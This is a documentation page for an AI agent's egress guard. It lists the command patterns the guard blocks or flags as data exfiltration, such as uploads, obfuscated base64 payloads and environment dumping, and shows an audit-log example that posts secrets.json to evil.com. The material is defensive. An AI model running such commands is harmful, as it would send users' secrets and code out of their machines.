---
title: Egress Guard
layout: docs
permalink: /safety/egress-guard/
eyebrow: Safety · Layer 2
description: How wow-agent detects and blocks data exfiltration attempts — patterns, heuristics, allowlists and the audit log.
---

The egress guard inspects every command before execution and stops data from leaving your machine.

## Blocked automatically

| Pattern | Example | Why |
|---|---|---|
| upload verbs | `curl -X POST/-d/-T`, `wget --post-file` | data upload |
| remote copy | `scp`, `sftp`, `rsync … host:` | file transfer |
| publish | `npm publish`, `docker push`, `twine upload` | package exfiltration |
| git egress | `git push`, `git remote add` + push | source leakage |
| cloud upload | `aws s3 cp … s3://`, `gcloud storage cp` | bucket exfiltration |

## Heuristics on top

- **base64 payloads**: `curl -d "$(base64 …)"` decoded and inspected
- **env dumping**: commands embedding `$(env)`, `$(cat secrets*)`
- **obfuscation**: `bash -c "$(echo … | base64 -d)"` flagged for confirmation
- **pipe-to-network**: `cat file | curl -d @- …`

## Outcomes

| Outcome | When | UX |
|---|---|---|
| **BLOCK** | high-confidence exfiltration | command refused, logged |
| **CONFIRM** | ambiguous (e.g. `git push`) | typed `YES` required |
| **ALLOW** | internal/loopback or allowlisted | logged for audit |

## Allowlisting legitimate flows

```bash
# ~/.wow-agent.env
WOW_CUSTOM_ALLOW_PATTERNS='["registry.internal.corp", "my-deploy-tool"]'
```

Allowlist entries are regex matched against the command line. Keep them narrow — hostname or tool name, never `.*`.

## Audit log

```text
/safe logs
[10:30:45] EGRESS_BLOCKED  curl -X POST https://evil.com -d @secrets.json
[10:31:22] EGRESS_CONFIRM  git push origin feat/auth (user: YES)
[10:32:10] EGRESS_ALLOWED   curl http://localhost:8000/health
```

Every decision — including allows — is recorded with the full command line, matched pattern and session id.

## Testing the guard

```bash
/safe test                     # built-in self-test
!curl -X POST https://httpbin.org/post -d x   # should BLOCK
!git push origin test-branchn                 # should CONFIRM
```

## Limits

The guard inspects **commands**, not program behavior — a compiled binary could theoretically network inside an unsandboxed run. That's what [Layer 1: the network sandbox](/safety/network-sandbox/) is for. Defense in depth, always both.
